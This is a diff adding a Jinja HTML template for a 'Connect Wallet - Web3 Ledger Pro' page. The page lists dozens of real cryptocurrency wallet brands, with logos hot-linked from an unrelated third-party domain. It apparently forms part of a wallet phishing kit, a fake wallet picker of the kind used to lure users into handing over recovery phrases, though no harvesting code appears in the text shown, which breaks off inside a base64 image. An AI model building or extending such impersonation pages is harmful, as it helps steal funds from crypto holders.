@@ -1,0 +1,808 @@
+{% extends 'base.html' %}
+
+{% block title %}Connect Wallet - Web3 Ledger Pro{% endblock %}
+
+{% block content %}
+<main class="px-4 py-16 min-h-screen">
+    <div class="max-w-6xl mx-auto">
+        <h1 class="text-4xl font-bold text-white mb-12 text-center">Choose Wallet</h1>
+        
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+            <!-- Trust Wallet -->
+            <div class="wallet-card flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer" 
+                 data-wallet-name="Trust" 
+                 data-wallet-img="https://web3connect.org/en/web3bridge.io/img/trust-wallet-66f8777532931d9c09b633344981a6a9.png">
+                <img src="https://web3connect.org/en/web3bridge.io/img/trust-wallet-66f8777532931d9c09b633344981a6a9.png" alt="Trust" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Trust</span>
+            </div>
+            
+            <!-- Exodus -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/img/exodus.png" alt="Exodus" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Exodus</span>
+            </div>
+            
+            <!-- Lobstr -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/lobstr.png" alt="Lobstr" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Lobstr</span>
+            </div>
+            
+            <!-- Connect -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/iogo.jpg" alt="Connect" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Connect</span>
+            </div>
+            
+            <!-- Wallet Connect -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/iogo.jpg" alt="Wallet Connect" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Wallet connect</span>
+            </div>
+            
+            <!-- Atomic -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/atomic-4c02d2b33cf091fd83c7a49819394e41.png" alt="Atomic" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Atomic</span>
+            </div>
+            
+            <!-- Metamask -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png" alt="Metamask" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Metamask</span>
+            </div>
+            
+            <!-- Rainbow -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/rainbow-207dda8d66f8ffc00a21e4fcc5ce0a73.png" alt="Rainbow" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Rainbow</span>
+            </div>
+            
+            <!-- Argent -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/anchor.png" alt="Argent" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Argent</span>
+            </div>
+            
+            <!-- Gnosis Safe Multisig -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/crypto-4cbeac57421fb3ca2573db2cf448169a.png" alt="Gnosis Safe" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Gnosis Safe Multisig</span>
+            </div>
+            
+            <!-- Crypto.com | DeFi Wallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/crypto-4cbeac57421fb3ca2573db2cf448169a.png" alt="Crypto.com" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Crypto.com | DeFi Wallet</span>
+            </div>
+            
+            <!-- Pillar -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/anchor.png" alt="Pillar" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Pillar</span>
+            </div>
+            
+            <!-- Anchor -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/anchor.png" alt="Anchor" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Anchor</span>
+            </div>
+            
+            <!-- ONTO -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/onto-983003d35fe32bf916f9eda381f138f7.png" alt="ONTO" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">ONTO</span>
+            </div>
+            
+            <!-- TokenPocket -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/tokenpocket-57a4a886cc644e5237ac1558226154cb.png" alt="TokenPocket" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">TokenPocket</span>
+            </div>
+            
+            <!-- MathWallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/math-wallet-9e2256cfa5aad3b33af05f3fee4dc9ef.png" alt="MathWallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">MathWallet</span>
+            </div>
+            
+            <!-- BitPay -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/bitpay-1573dd6c95eb38386f181048663590d0.jpg" alt="BitPay" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">BitPay</span>
+            </div>
+            
+            <!-- Maiar -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/maiar.png" alt="Maiar" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Maiar</span>
+            </div>
+            
+            <!-- Ledger Live -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/ledgerlive-9fe387e571fb42ed5cdf08e29bc920ed.png" alt="Ledger Live" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Ledger Live</span>
+            </div>
+            
+            <!-- Walleth -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/walleth-b60336f8dd9ea86285408cb4f96634d1.png" alt="Walleth" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Walleth</span>
+            </div>
+            
+            <!-- Authereum -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/authereum-32f3939207b77c1837547d5ed4f86110.png" alt="Authereum" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Authereum</span>
+            </div>
+            
+            <!-- Huobi Wallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/img/huobi-wallet-8c67.png" alt="Huobi Wallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Huobi Wallet</span>
+            </div>
+            
+            <!-- Eidoo -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/img/eidoo-3f8e.png" alt="Eidoo" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Eidoo</span>
+            </div>
+            
+            <!-- MYKEY -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/mykey-7419df5270c0406c80cba19fa5165923.png" alt="MYKEY" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">MYKEY</span>
+            </div>
+            
+            <!-- Loopring Wallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/img/loopring-wallet-b22e.png" alt="Loopring Wallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Loopring Wallet</span>
+            </div>
+            
+            <!-- TrustVault -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/trustvault-9031a67f82293fc50ead978f936cfff3.png" alt="TrustVault" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">TrustVault</span>
+            </div>
+            
+            <!-- Coin98 -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/coin98-c5b50adaceaf474e48ef1dad150d0829.png" alt="Coin98" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Coin98</span>
+            </div>
+            
+            <!-- CoolWallet S -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/coolwallet-s-cc612ee7a151c1863293fcc69dd0f677.png" alt="CoolWallet S" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">CoolWallet S</span>
+            </div>
+            
+            <!-- Alice -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/img/alice-67f3.png" alt="Alice" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Alice</span>
+            </div>
+            
+            <!-- AlphaWallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/img/alphawallet-bc86.png" alt="AlphaWallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">AlphaWallet</span>
+            </div>
+            
+            <!-- GridPlus -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/gridplus-8cedce167d37ddaa02f2afdf55841d8c.png" alt="GridPlus" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">GridPlus</span>
+            </div>
+            
+            <!-- CYBAVO Wallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/cybavowallet-16e7e96f2e3df01fe2170da5267774b5.png" alt="CYBAVO Wallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">CYBAVO Wallet</span>
+            </div>
+            
+            <!-- Nash -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/img/nash-d2e6.png" alt="Nash" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Nash</span>
+            </div>
+            
+            <!-- Tokenary -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/img/tokenary-a6a5.png" alt="Tokenary" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Tokenary</span>
+            </div>
+            
+            <!-- Wazirx -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/wazirx-logo-rounded.9bff9f42.png" alt="Wazirx" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Wazirx</span>
+            </div>
+            
+            <!-- D'CENT Wallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/dcentwallet-f0bdbaec0837431b87ac9886bb22dfd5.png" alt="D'CENT Wallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">D'CENT Wallet</span>
+            </div>
+            
+            <!-- ZelCore -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/zelcore-d4c1a7a444b95612f6373f0b536b6ccb.png" alt="ZelCore" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">ZelCore</span>
+            </div>
+            
+            <!-- Coinomi -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/coinomi-7eecd68e38d78752d68b7232bd9c58d9.jpg" alt="Coinomi" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Coinomi</span>
+            </div>
+            
+            <!-- Torus -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/img/torus-51f9.png" alt="Torus" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Torus</span>
+            </div>
+            
+            <!-- Spatium -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/img/spatium-5c51.png" alt="Spatium" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Spatium</span>
+            </div>
+            
+            <!-- SafePal -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/safepal-1022b40e2ea3a4a6bb19cf6ff28d8b92.png" alt="SafePal" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">SafePal</span>
+            </div>
+            
+            <!-- Equal -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/img/equal-8d63.png" alt="Equal" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Equal</span>
+            </div>
+            
+            <!-- Infinito -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/infinito-wallet-68da061495160c96f4bcb5e70e612fdd.png" alt="Infinito" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Infinito</span>
+            </div>
+            
+            <!-- wallet.io -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/wallet.io-198f396de22fe25eb370f46544abe69d.png" alt="wallet.io" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">wallet.io</span>
+            </div>
+            
+            <!-- Infinity Wallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png" alt="Infinity Wallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Infinity Wallet</span>
+            </div>
+            
+            <!-- Ownbit -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png" alt="Ownbit" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Ownbit</span>
+            </div>
+            
+            <!-- EasyPocket -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/easypocket-436ea3270a7bf77c02a880bfc70d0ee8.jpg" alt="EasyPocket" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">EasyPocket</span>
+            </div>
+            
+            <!-- Bridge Wallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/img/bridgewallet-9a3e.png" alt="Bridge Wallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Bridge Wallet</span>
+            </div>
+            
+            <!-- SparkPoint -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png" alt="SparkPoint" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">SparkPoint</span>
+            </div>
+            
+            <!-- ViaWallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/viawallet-ae1502eddf4d2ed89abd36907dd3ae8a.png" alt="ViaWallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">ViaWallet</span>
+            </div>
+            
+            <!-- BitKeep -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/bitkeep-387b0ca7da4cf322f44c70c23064c529.png" alt="BitKeep" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">BitKeep</span>
+            </div>
+            
+            <!-- Vision -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/vision-928292fe642172a18e62feb5eaa2d639.png" alt="Vision" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Vision</span>
+            </div>
+            
+            <!-- SWFT Wallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/img/swft-wallet-7e77.png" alt="SWFT Wallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">SWFT Wallet</span>
+            </div>
+            
+            <!-- PEAKDEFI Wallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/peakdefi-2e1d4f97cc1a737a9aa765b3748ff315.png" alt="PEAKDEFI Wallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">PEAKDEFI Wallet</span>
+            </div>
+            
+            <!-- Cosmostation -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/cosmosstation.png" alt="Cosmostation" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Cosmostation</span>
+            </div>
+            
+            <!-- Graph Protocol -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/graph.jpg" alt="Graph Protocol" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Graph Protocol</span>
+            </div>
+            
+            <!-- KardiaChain -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/kardachain.png" alt="KardiaChain" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">KardiaChain</span>
+            </div>
+            
+            <!-- Keplr -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/keplr.png" alt="Keplr" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Keplr</span>
+            </div>
+            
+            <!-- Harmony -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/harmony.png" alt="Harmony" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Harmony</span>
+            </div>
+            
+            <!-- ICONex -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/iconex.png" alt="ICONex" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">ICONex</span>
+            </div>
+            
+            <!-- Fetch -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/fetch.jpg" alt="Fetch" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Fetch</span>
+            </div>
+            
+            <!-- XDC Wallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/xdc-9a98bff95dffc41869b8e77912a6cc54.png" alt="XDC Wallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">XDC Wallet</span>
+            </div>
+            
+            <!-- Unstoppable Wallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/unstoppable-0d3474dcd7572ac2080b0f4ce632dfac.png" alt="Unstoppable Wallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Unstoppable Wallet</span>
+            </div>
+            
+            <!-- MEET.ONE -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/meetone-01093db7d99e3e6cf5cca68b616f8255.jpg" alt="MEET.ONE" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">MEET.ONE</span>
+            </div>
+            
+            <!-- Dok Wallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/dok-a32c522e109217cc2a1a2a310f3c9bf7.png" alt="Dok Wallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Dok Wallet</span>
+            </div>
+            
+            <!-- AT.Wallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/atwallet-2611d814a50a964b89d5f8bc1e5cb3a0.png" alt="AT.Wallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">AT.Wallet</span>
+            </div>
+            
+            <!-- MoriX Wallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/morixwallet-aa7d607cf9ad52afeb3b7c83e5f34eba.png" alt="MoriX Wallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">MoriX Wallet</span>
+            </div>
+            
+            <!-- Midas Wallet -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="https://web3connect.org/en/web3bridge.io/img/midas-wallet-5c5057d972ca621414f077541845fc61.png" alt="Midas Wallet" class="w-10 h-10 rounded-full object-cover flex-shrink-0">
+                <span class="text-white font-medium">Midas Wallet</span>
+            </div>
+            
+            <!-- Ellipal -->
+            <div class="flex items-center gap-4 p-4 glass rounded-lg hover:bg-white/10 transition cursor-pointer">
+                <img src="data:image/png;base64,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